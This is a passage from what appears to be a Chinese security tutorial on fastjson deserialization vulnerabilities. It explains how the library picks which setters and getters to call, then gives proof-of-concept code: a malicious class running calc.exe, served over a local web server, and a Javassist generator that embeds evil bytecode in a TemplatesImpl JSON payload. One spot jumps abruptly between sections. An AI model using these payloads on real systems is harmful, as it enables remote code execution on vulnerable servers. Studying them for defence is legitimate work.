        }
        //在输出时会自动调用的对象ToString函数
        public String toString() {
            String s = "[Person Object] name=" + this.name + " full_name=" + this.full_name  + ", age=" + this.age + ", prop=" + this.prop + ", sex=" + this.sex;
            return s;
        }
    }
被屏蔽的type反序列化实验：
    package com.fastjson;
    import com.alibaba.fastjson.JSON;
    public class type {
        public static void main(String[] args) {
            String eneity3 = "{\"被屏蔽的type\":\"com.fastjson.Person\", \"name\":\"lala\", \"full_name\":\"lalalolo\", \"age\": 13, \"prop\": {\"123\":123}, \"sex\": 1}";
            //反序列化
            Object obj = JSON.parseObject(eneity3,Person.class);
            //输出会调用obj对象的tooString函数
            System.out.println(obj);
        }
    }
结果如下：
    Person构造函数
    setAge()
    getProp()
    [Person Object] name=lala full_name=null, age=13, prop=null, sex=null
    public name 反序列化成功
    private full_name 反序列化失败
    private age setAge函数被调用
    private sex getsex函数没有被调用
    private prop getprop函数被成功调用
可以得知：
  * public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。
  * getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用
决定这个set/get函数是否将被调用的代码最终在`com.alibaba.fastjson.util.JavaBeanInfo#build`函数处
在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法
**set开头的方法要求如下：**
  * 方法名长度大于4且以set开头，且第四个字母要是大写
  * 非静态方法
  * 返回类型为void或当前类
  * 参数个数为1个
寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名（好像会过滤_，就是set_name这样的方法名中的下划线会被略过，得到name）。再去跟这个类的属性去比对有没有这个名称的属性。
如果没有这个属性并且这个set方法的输入是一个布尔型（是boolean类型，不是Boolean类型，这两个是不一样的），会重新给属性名前面加上 **is**
，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。
> 这里的is就是有的网上有的文章中说反序列化会自动调用get、set、is方法的由来。个人觉得这种说法应该是错误的。
>
>
> 真实情况应该是确认存在符合setXxx方法后，会与这个方法绑定一个xxx属性，如果xxx属性不存在则会绑定isXx属性（这里is后第一个字符需要大写，才会被绑定）。并没有调用is开头的方法
>
>
> 自己从源码中分析或者尝试在类中添加isXx方法都是不会被调用的，这里只是为了指出其他文章中的一个错误。这个与调用的set方法绑定的属性，再之后并没有发现对于调用过程有什么影响。
>
> 所以只要目标类中有满足条件的set方法，然后得到的方法变量名存在于序列化字符串中，这个set方法就可以被调用。
>
> 如果有老哥确定是否可以调用is方法，可以联系我，非常感谢。
**get开头的方法要求如下：**
  * 方法名长度大于等于4 
  * 非静态方法
  * 以get开头且第4个字母为大写
  * 无传入参数
  * 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong
所以我们上面例子中的getsex方法没有被调用是因为返回类型不符合，而getprop方法被成功调用是因为Properties 继承
Hashtable，而Hashtable实现了Map接口，返回类型符合条件。
再顺便看一下最后触发方法调用的地方com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue，（在被调用的方法中下断点即可）
那么至此我们可以知道
  * 被屏蔽的type可以指定反序列化成服务器上的任意类
  * 然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）
  * 如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）
> 上面说到readObejct("")还会额外调用toJSON调用所有getter函数，可以不符合要求。
看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。
但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。
对应反序列化攻击利用三要素来说，以上我们就是找到了readObject复写点，下面来探讨反序列化利用链。
我们先来看最开始的漏洞版本是 var4) {
            exec("xterm");
            return null;
        }
        public static String exec(String var0) {
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (IOException var2) {
                var2.printStackTrace();
            }
            return "";
        }
        public static void main(String[] var0) {
            exec("123");
        }
    }
在1.8下编译后使用python起web服务
`py -3 -m http.server 8090`
## 【 对于 JDK1.7u21 Gadgets 不熟悉的同学，可以参考我之前的文章。
>
>
> 在之前的文章也说过，TemplatesImpl对应的整条利用链是只有在JDK1.7u21附近的版本才能使用，但是最后TemplatesImpl这个类的触发点，其实是1.7全版本通用的。（因为修复只砍在了中间环节AnnotationInvocationHandler类）
>
> 那么实际上fastjson正是只利用了最后的TemplatesImpl触发点。这个利用方式实际上是1.7版本通用的。  
>  其利用局限性在于服务端反序列化json的语句必须要支持private属性。
在Github上传的项目中`版本24.jdk7u21.java`是网上的payload。需要自己编译生成一个class文件不是很方便。
在`版本24.jdk7u21_mine`中自己把7u21链的payload中拿过来，自己改了下，可以自动生成payload。
    public class jdk7u21_mine {
        //最终执行payload的类的原始模型
        //ps.要payload在static模块中执行的话，原始模型需要用static方式。
        public static class lala{
        }
        //返回一个在实例化过程中执行任意代码的恶意类的byte码
        //如果对于这部分生成原理不清楚，参考以前的文章
        public static byte[] getevilbyte() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.get(lala.class.getName());
            //要执行的最终命令
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            //之前说的静态初始化块和构造方法均可，这边用静态方法
            cc.makeClassInitializer().insertBefore(cmd);
    //        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
    //        cons.setBody("{"+cmd+"}");
    //        cc.addConstructor(cons);
            //设置不重复的类名
            String randomClassName = "LaLa"+System.nanoTime();
            cc.setName(randomClassName);
            //设置满足条件的父类
            cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
            //获取字节码
            byte[] lalaByteCodes = cc.toBytecode();
            return lalaByteCodes;
        }
        //生成payload，触发payload
        public static void  poc() throws Exception {
            //生成攻击payload
            byte[] evilCode = getevilbyte();//生成恶意类的字节码
            String evilCode_base64 = Base64.encodeBase64String(evilCode);//使用base64封装
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{"+
                    "\"被屏蔽的type\":\"" + NASTY_CLASS +"\","+
                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                    "'_name':'a.b',"+
                    "'_tfactory':{ },"+
                    "'_outputProperties':{ }"+
                    "}\n";